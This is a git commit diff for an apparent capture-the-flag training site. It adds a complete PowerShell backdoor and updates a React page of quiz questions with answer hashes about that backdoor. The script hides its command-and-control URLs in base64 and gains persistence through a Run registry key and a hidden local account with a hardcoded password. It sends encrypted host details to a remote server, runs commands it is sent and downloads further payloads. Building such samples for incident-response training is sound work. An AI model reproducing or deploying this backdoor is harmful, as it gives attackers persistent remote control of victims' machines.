70b70bf284bb21245f55cdfbcfc2b7dfe5e3b23f
xantus10 <jaroslav.zaba@post.cz>
2026-02-05 18:46:36 +0100

    Added ps script

--- public/mitre/image.ps1
+++ public/mitre/image.ps1
@@ -1,1 +1,144 @@
-Write-Output "Test";
+$SF = Join-Path $env:APPDATA "Windows" "CurrentVersion"
+$U = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3hhbnR1czEwLmdpdGh1Yi5pby9DVEYvbWl0cmUvY2MudHh0"));
+$CC = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovLzEwLjE1MC4wLjk5Lw=="));
+$LASTCOM = ""
+$KEY = "era8!!a8wRRQ7t*u"
+$INITFN = Join-Path $SF "win.ini"
+
+######### Init Setup
+if (-not (Test-Path $INITFN)) {
+  New-Item -Path $INITFN -ItemType File
+  $rp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))
+  $rn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTG9nb25JbnRTZXJ2aWNl"))
+  $tf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezYyMEUwREZGLTFBQzItNDVBRi04MUU5LURBMDE2OEQxRUFCNH0="))
+  $tfp = Join-Path $SF $tf
+  $rv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIC9jIHR5cGUg")) + $tfp + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IHwgcG93ZXJzaGVsbA=="))
+  Set-ItemProperty -Path $rp -Name $rn -Value $rv
+
+  $un = -join (68,101,102,97,117,108,116,83,121,115,116,101,109 | ForEach-Object { [char]$_ })
+  $pw = -join (77,49,55,55,42,51,97,84,55,64,91,75 | ForEach-Object { [char]$_ })
+
+  try {
+      if (-not (Get-LocalUser -Name $un -ErrorAction SilentlyContinue)) {
+
+          net user $un $pw /add /comment:"Default account for NT/SYSTEM tasks."
+      }
+  }
+  catch {}
+}
+
+######### Functionality
+function Enc {
+  param (
+    [string] $s
+  )
+  $inpb = [System.Text.Encoding]::UTF8.GetBytes($s)
+  $kb = [System.Text.Encoding]::UTF8.GetBytes($KEY)
+
+  $out = New-Object byte[] $inpb.Length
+
+  for ($i = 0; $i -lt $inpb.Length; $i++) {
+    $out[$i] = $inpb[$i] -bxor $kb[$i % $kb.Length]
+  }
+
+  return [System.Convert]::ToBase64String($out);
+}
+
+function ExToCC {
+  param (
+    [string] $cont
+  )
+  $e = Enc $cont
+  $body = @{
+    cont = $e
+  } | ConvertTo-Json
+  Invoke-WebRequest -Uri $CC -Method Post -ContentType "application/json" -Body $body
+}
+
+function JoinCC {
+  $hstnm = $env:COMPUTERNAME
+  $usrnm = $env:USERNAME
+  $ipaddr = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceOperationalStatus Up | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1 -ExpandProperty IPAddress)
+  $msg = "JOIN BY: " + $hstnm + $usrnm + $ipaddr
+  ExToCC $msg
+}
+
+function ComExec {
+  param (
+    [string] $c
+  )
+  $output = Invoke-Expression $c | Out-String
+  return $output
+}
+
+function ComDnld {
+  param (
+    [string] $DnldUrl
+  )
+  $dir = Join-Path $SF "tools"
+  if (-not (Test-Path $dir)) {
+    New-Item -ItemType Directory -Path $dir | Out-Null
+  }
+  $fn = [System.IO.Path]::GetFileName($DnldUrl)
+  $ofp = Join-Path $dir $fn
+
+  Invoke-WebRequest -Uri $DnldUrl -OutFile $ofp
+}
+
+function ComRunCmd {
+  param (
+    [string] $cmdline
+  )
+  
+  $out = cmd.exe /c $cmdline 2>&1 | Out-String
+  return $out
+}
+
+function ComDisc {
+  $ulst = Get-LocalUser | Select-Object -ExpandProperty Name
+  $avchk = "NOT PRESENT"
+  if (Get-Process -Name "avp" -ErrorAction SilentlyContinue) {
+    $avchk = "PRESENT"
+  }
+  return "DISC COM OUT`r`n" + $ulst + "`r`nAV: " + $avchk
+}
+
+function ReqCommand {
+  $res = Invoke-WebRequest -Uri $U -UseBasicParsing
+  $cont = $res.Content
+  if ($cont == $global:LASTCOM) {return}
+  $global:LASTCOM = $cont
+  $parts = $cont -split ":", 2
+  $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0]))
+  $arg = if ($parts.Count -gt 1) { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1])) } else { "" }
+  switch ($com) {
+    "invexp" {
+      $out = ComExec $arg
+      ExToCC $out
+    }
+    "chngkey" {
+      $global:KEY = $arg
+    }
+    "dnld" {
+      ComDnld $arg
+    }
+    "runcmd" {
+      $out = ComRunCmd $arg
+      ExToCC $out
+    }
+    "disc" {
+      $out = ComDisc
+      ExToCC $out
+    }
+    default {}
+  }
+}
+
+JoinCC
+while ($true) {
+  try {
+    ReqCommand
+    Start-Sleep -Seconds 60
+  }
+  catch {}
+}
--- src/Pages/CTFs/CMITRE.tsx
+++ src/Pages/CTFs/CMITRE.tsx
@@ -10,23 +10,38 @@ function CMITRE() {
         {title: 'Enter IP of a user that connected from a laptop', solutionHash: '75206179fb993de1c85999d4b57805c5b9458260da4640eea6dc8fda2d3b6f74'},
         {title: 'Enter password of lucia.vary@vulncomp.com', solutionHash: 'bb02146fca5b3e437a1e83da65b8dcc95fb00ee8cbcc9605d5b4828660f17f61'},
         {title: 'Which IP address tried to enumerate accounts', solutionHash: '3696668f6f827407e5ff469091d3da2449de15b914b45b1afe87aeb5436f3ecb'},
-        {title: 'This behavior corresponds to one MITRE technique and one subtechnique, enter them like this: TXXXX;TXXXX.XXX', solutionHash: '94f5021d8ba48f79cd0eecb47bf164d52adc456e5c335abc4ebae98f0123e725'}
+        {title: 'The attacker\'s actions correspond to one mitre technique (format: TXXXX)', solutionHash: 'a66c2b959ccc076093e1e9d98e45d58385c15a1344318a72a1d2502d597bbf7e'},
+        {title: 'The data the attacker targeted have their mitre subtechnique (format: TXXXX.XXX)', solutionHash: 'c0a9e1102affc28461b11b8c33ad970494051d328b9b8f9e7479651373ec63be'},
       ]} />
       <MultipartChallenge title="Initial Access - Email" content={<><Text>After recon, the attacker sent multiple phishing emails which contained malicious content. One of these is the one in the file fake.eml</Text></>} files={[{name: 'fake.eml', path: 'mitre/fake.eml'}]} 
       parts={[
         {title: 'What is the displayed "From" address in the email?', solutionHash: '288bf0c2227716cce1ea60d8b23d8016da2033f5467ca8a5147bcb3827fd6ae2'},
         {title: 'What is the real attacker email address?', solutionHash: '742c600d416c796bb8a4930b441713423fc168791e0e6dfc00414e67566ebc2a'},
         {title: 'What is the name of the malicious attachment?', solutionHash: '5982a6b86b99c6303357c99393ad5c90a69b21506b200ecaa9a4952c4a70d9ed'},
-        {title: 'What mitre subtechnique matches this Initial Access attempt? (TXXXX.XXX)', solutionHash: '93cb3ab7baff6e215961332a7f9aef85cb5a22704e006e6a19fbf3b9017c03da'}
+        {title: 'What mitre subtechnique matches this Initial Access attempt? (format: TXXXX.XXX)', solutionHash: '93cb3ab7baff6e215961332a7f9aef85cb5a22704e006e6a19fbf3b9017c03da'}
       ]} />
       <MultipartChallenge title="Execution - HTML application" content={<><Text>After downloading and unzipping the attachment the user continued to make mistakes.</Text><Text>Note: You need to extract the attachment on your own.</Text></>} 
       parts={[
-        {title: 'What is the extension of the file? (enter .XXX)', solutionHash: '0303a6035cc5c4585cf6b031dd5426e54290bdff4a77a0114554c5a80522eeb0'},
-        {title: 'What executable is going to execute this file (on windows; enter X.exe)', solutionHash: '1c753a7f12afb9e4ad34399cd85f769ee57836bd9d4f074be5c611e43e45ac56'},
-        {title: 'Which mitre subtechnique symbolises the fact that user executed the file? (enter TXXXX.XXX)', solutionHash: 'a2f62dddec5a008f68df4e27831d4ff86460b8d0340114a269e0d6c8b07e0ec1'},
-        {title: 'Which mitre subtechnique symbolises the language the executable malware is written in? (enter TXXXX.XXX)', solutionHash: 'bb6c1417746337f8979ae8582292bb55ef659be8c1b1cfaa93516a9627321843'},
+        {title: 'What is the extension of the file? (format: .XXX)', solutionHash: '0303a6035cc5c4585cf6b031dd5426e54290bdff4a77a0114554c5a80522eeb0'},
+        {title: 'What executable is going to execute this file (on windows; format: name.exe)', solutionHash: '1c753a7f12afb9e4ad34399cd85f769ee57836bd9d4f074be5c611e43e45ac56'},
+        {title: 'Which mitre subtechnique symbolises the fact that user executed the file? (format: TXXXX.XXX)', solutionHash: 'a2f62dddec5a008f68df4e27831d4ff86460b8d0340114a269e0d6c8b07e0ec1'},
+        {title: 'Which mitre subtechnique symbolises the language the executable malware is written in? (format: TXXXX.XXX)', solutionHash: 'bb6c1417746337f8979ae8582292bb55ef659be8c1b1cfaa93516a9627321843'},
         {title: 'What is the name of the second malware phase file? (The local filename)', solutionHash: '1e3450b1bbd405570df9827e76955edfef9d53ca9122083dfc8550a730b8494c'},
-        {title: 'What program will execute the second phase? (enter X.exe)', solutionHash: 'f307e73a3447b10444e67233700c1aa5ca8e3673dd2f292084bf485583caad6f'}
+        {title: 'What program will execute the second phase? (format: name.exe)', solutionHash: 'f307e73a3447b10444e67233700c1aa5ca8e3673dd2f292084bf485583caad6f'}
+      ]} />
+      <MultipartChallenge title="Persistence - Windows" content={<><Text>Second phase of the malware serves as the final malware and also does some setup for itself - among others, persistence techniques.</Text><Text>Note: You need to request the second phase yourselves, utilize the download url in previous file.</Text></>}
+      parts={[
+        {title: 'What is the registry key name (not path) the malware creates?', solutionHash: '83071950bb4108899e6b7e02510838d61867bf9bba98fe3f7056d24c61614c05'},
+        {title: 'This sort of persistence mechanism maps to a mitre subtechnique (format: TXXXX.XXX)', solutionHash: 'b442ac9026d19b39de7e5dc831febc438055142185c335f847e77ee4699ec15e'},
+        {title: 'As a backup the script also creates a user account for persistence. Enter its name and password (separated by :, ie. username:password)', solutionHash: 'e5934d1f0ddae0a3b60c38594fdcc0573a39ccf3879b167c94df9bf16305d7b4'},
+        {title: 'The account creation also maps to a mitre subtechnique (format: TXXXX.XXX)', solutionHash: 'a4a459ef8aae26dd8a05c636ac673eb6e6cd8c7a7076e37d6038e34b1de0c019'}
+      ]} />
+      <MultipartChallenge title="Discovery - User accounts and AV discovery" content={<><Text>One of the attackers first actions is discovery, to gather information on his surroundings. He created a special command+function in the malware for it.</Text></>} hints={["Check out the ComDisc function"]}
+      parts={[
+        {title: 'What PS cmdlet does the attacker use to get list of local user accounts (format: xxx-xxxxxxxxx)', solutionHash: 'baacfaccc93f1719ef2081c305f843f73c30c4be5f5ebb14047f4ea617030ee0'},
+        {title: 'This of course maps to a mitre subtechnique (format: TXXXX.XXX)', solutionHash: '2a01f56787d8c9ea3a2c8668d5429f337fc836eef1b2c2d2db81e7c1731f028a'},
+        {title: 'The malware also checks for the presence of an antivirus executable. Which AV program is it? (The answer is a single 9letter word; all lowercase)', solutionHash: '4b6afdd16374f5a993eec1020ae1af0003087fc801e963f7a8b2b6acfa8c8951'},
+        {title: 'And what would the mitre attack subtechnique for that be? (format: TXXXX.XXX; Focus on the antivirus SW part)', solutionHash: '030841a5fca6f0d2a083eaaa0dc1c804f82f71e019e40be5c4f451a7f0ab1e56'}
       ]} />
     </Stack>
   );
